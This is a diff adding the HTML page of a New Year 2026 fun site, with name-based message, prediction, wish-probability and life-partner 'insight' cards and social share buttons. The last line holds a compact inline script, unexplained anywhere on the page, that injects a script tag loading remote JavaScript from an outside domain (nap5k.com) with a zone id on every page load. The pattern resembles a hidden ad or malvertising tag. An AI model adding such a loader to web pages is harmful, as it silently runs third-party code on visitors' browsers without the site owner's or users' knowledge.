@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to 2026 - Your New Year Journey</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Countdown Timer Overlay (shows before midnight) -->
+    <div id="countdown-overlay" class="countdown-overlay hidden">
+        <div class="countdown-container">
+            <h1>Countdown to 2026</h1>
+            <div id="countdown-display" class="countdown-display"></div>
+            <p class="countdown-message">Get ready for your journey...</p>
+        </div>
+    </div>
+
+    <!-- Fireworks Canvas -->
+    <canvas id="fireworks-canvas"></canvas>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <h1 class="glow-text">✨ Welcome to 2026 ✨</h1>
+            <p class="subtitle">Discover what this year holds for you</p>
+        </header>
+
+        <!-- Feature Cards -->
+        <div class="features-grid">
+
+            <!-- 1. One-Line Message Generator -->
+            <div class="card glass-card" data-feature="message">
+                <div class="card-header">
+                    <h2>💫 Your 2026 Message</h2>
+                    <p class="card-description">Get your personalized motivational sentence</p>
+                </div>
+                <div class="card-body">
+                    <input
+                        type="text"
+                        id="message-name"
+                        class="input-field"
+                        placeholder="Enter your name"
+                        maxlength="30"
+                    >
+                    <button onclick="generateMessage()" class="btn btn-primary">
+                        Generate Message
+                    </button>
+                    <div id="message-result" class="result-box hidden"></div>
+                </div>
+            </div>
+
+            <!-- 2. 2026 Prediction -->
+            <div class="card glass-card" data-feature="prediction">
+                <div class="card-header">
+                    <h2>🔮 2026 Prediction</h2>
+                    <p class="card-description">See what the year has in store for you</p>
+                </div>
+                <div class="card-body">
+                    <input
+                        type="text"
+                        id="prediction-name"
+                        class="input-field"
+                        placeholder="Enter your name"
+                        maxlength="30"
+                    >
+                    <div class="mood-selector">
+                        <label class="mood-label">Choose your mood:</label>
+                        <div class="mood-buttons">
+                            <button class="mood-btn" data-mood="happy" onclick="selectMood('happy')">
+                                😊 Happy
+                            </button>
+                            <button class="mood-btn" data-mood="calm" onclick="selectMood('calm')">
+                                😌 Calm
+                            </button>
+                            <button class="mood-btn" data-mood="focused" onclick="selectMood('focused')">
+                                🎯 Focused
+                            </button>
+                            <button class="mood-btn" data-mood="unsure" onclick="selectMood('unsure')">
+                                🤔 Unsure
+                            </button>
+                        </div>
+                    </div>
+                    <button onclick="generatePrediction()" class="btn btn-primary">
+                        Get Prediction
+                    </button>
+                    <div id="prediction-result" class="result-box hidden"></div>
+                </div>
+            </div>
+
+            <!-- 3. Wish Probability Checker -->
+            <div class="card glass-card" data-feature="wish">
+                <div class="card-header">
+                    <h2>🌟 Wish Probability</h2>
+                    <p class="card-description">Check the chances of your wish coming true</p>
+                </div>
+                <div class="card-body">
+                    <textarea
+                        id="wish-text"
+                        class="input-field textarea-field"
+                        placeholder="Enter your wish for 2026..."
+                        maxlength="150"
+                        rows="3"
+                    ></textarea>
+                    <button onclick="checkWishProbability()" class="btn btn-primary">
+                        Check Probability
+                    </button>
+                    <div id="wish-result" class="result-box hidden"></div>
+                </div>
+            </div>
+
+            <!-- 4. Life Partner Prediction (Optional) -->
+            <div class="card glass-card" data-feature="partner">
+                <div class="card-header">
+                    <h2>💝 Life Partner Insight</h2>
+                    <p class="card-description">Get a respectful insight about your love journey</p>
+                </div>
+                <div class="card-body">
+                    <input
+                        type="text"
+                        id="partner-name"
+                        class="input-field"
+                        placeholder="Enter your name"
+                        maxlength="30"
+                    >
+                    <div class="status-selector">
+                        <label class="status-label">Current status:</label>
+                        <div class="status-buttons">
+                            <button class="status-btn" data-status="single" onclick="selectStatus('single')">
+                                💫 Single
+                            </button>
+                            <button class="status-btn" data-status="healing" onclick="selectStatus('healing')">
+                                🌱 Healing
+                            </button>
+                            <button class="status-btn" data-status="ready" onclick="selectStatus('ready')">
+                                💖 Ready
+                            </button>
+                        </div>
+                    </div>
+                    <button onclick="generatePartnerInsight()" class="btn btn-primary">
+                        Get Insight
+                    </button>
+                    <div id="partner-result" class="result-box hidden"></div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Social Share Section -->
+        <div class="share-section glass-card">
+            <h3>Share Your 2026 Journey</h3>
+            <div class="share-buttons">
+                <button onclick="shareOnTwitter()" class="btn btn-share">
+                    🐦 Share on Twitter
+                </button>
+                <button onclick="shareOnFacebook()" class="btn btn-share">
+                    📘 Share on Facebook
+                </button>
+                <button onclick="downloadResult()" class="btn btn-share">
+                    📥 Download Result
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>Made with ✨ for your 2026 journey</p>
+            <p class="footer-note">All predictions are for entertainment purposes only</p>
+        </footer>
+    </div>
+
+    <!-- Success Overlay (appears after prediction with fireworks) -->
+    <div id="success-overlay" class="success-overlay hidden">
+        <div class="success-message glow-text">
+            🎆 Welcome to 2026 🎆
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>(function(s){s.dataset.zone='9534120',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+</body>
+</html>
